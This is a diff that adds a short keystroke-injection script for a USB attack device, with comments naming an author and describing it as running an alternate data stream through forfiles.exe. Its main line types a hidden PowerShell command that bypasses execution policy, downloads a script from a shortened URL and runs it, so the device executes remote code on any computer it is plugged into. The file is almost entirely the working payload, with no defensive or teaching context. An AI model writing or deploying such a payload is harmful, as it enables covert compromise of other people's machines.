@@ -1,0 +1,7 @@
+REM by Joshua O' Brien
+REM runs an ADS via forfiles.exe
+REM uses forfile_exe2.ps1
+GUI r
+DEFAULT_DELAY 350
+STRING powershell -NoP -Ep Bypass -W H -C irm tnyr.me/mK4JtDx1Ws | iex
+ENTER
